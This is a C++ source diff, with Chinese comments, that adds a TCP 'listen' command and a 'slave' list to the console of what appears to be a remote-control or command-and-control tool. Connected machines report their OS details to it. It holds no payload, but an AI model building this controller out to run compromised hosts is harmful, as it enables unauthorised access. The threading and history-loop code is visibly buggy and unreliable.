@@ -5,33 +5,27 @@
 
 #include "cmd.h"
 #include <conio.h>
+#include <thread>
 #include "print.h"
 #include "slave.h"
+#include "tcp_server.h"
 
 namespace cmd
 {
-
 const ushort hist_size = 999 + 1;	// 命令历史记录上限, max: 999
 
-vector<string> arg;		// 参数
-deque<string>	hist;	// 历史记录
+list<Slave>			slave;
+vector<string>	arg;		// 参数
+deque<string>		hist;	// 历史记录
 
 // 命令行
 // TODO: 该函数有很大的进步空间
 void console()
 {
 	short				i, j;
-	const char* list[] = {	// 命令匹配列表
-			"cls",
-			"clear",
-			"exit",
-			"help",
-			"history",
-			"listen",
-			"ls",
-			"quit",
-			"use"
-	};
+	const char* list[] = {
+			// 命令匹配列表
+			"cls", "clear", "exit", "help", "history", "listen", "ls", "quit", "use"};
 	ushort list_size = sizeof(list) / sizeof(char*);
 	string cmd;	// 命令
 
@@ -274,7 +268,6 @@ void db()
 		// 检查user是否合法
 
 		// 检查dbname是否合法
-
 	}
 }
 
@@ -316,13 +309,46 @@ void history()
 
 	puts("  ID 命令");
 	puts("  -- ---");
-	for (i = hist.size(); i > 0; i--)
-		printf("  %-2d %s\n", i, hist[i].c_str());
+	for (i = hist.size(); i > 0; i--) printf("  %-2d %s\n", i, hist[i].c_str());
+}
+
+void thListen(TCPServer sock)
+{
+	Slave						slave_;
+	string					buf;
+	os_info_windows osInfoWindows;
+	os_info_linux		osInfoLinux;
+
+	slave_.socket(sock.accept());
+
+	// 获取操作系统内核名称和系统基本信息
+	slave_.recv(buf);
+	slave_.os_info(buf);
+	
 }
 
 // 监听
 void listen()
 {
+	TCPServer sock;
+	thread		pthListen(thListen, sock);
+
+	// 绑定
+	if (!sock.bind(atoi(arg[1].c_str())))
+	{
+		print::err("绑定失败");
+		return;
+	}
+
+	// 监听
+	if (!sock.listen())
+	{
+		print::err("监听失败");
+		return;
+	}
+
+	pthListen.detach();
+
 	print::good("成功开启监听任务");
 }
 
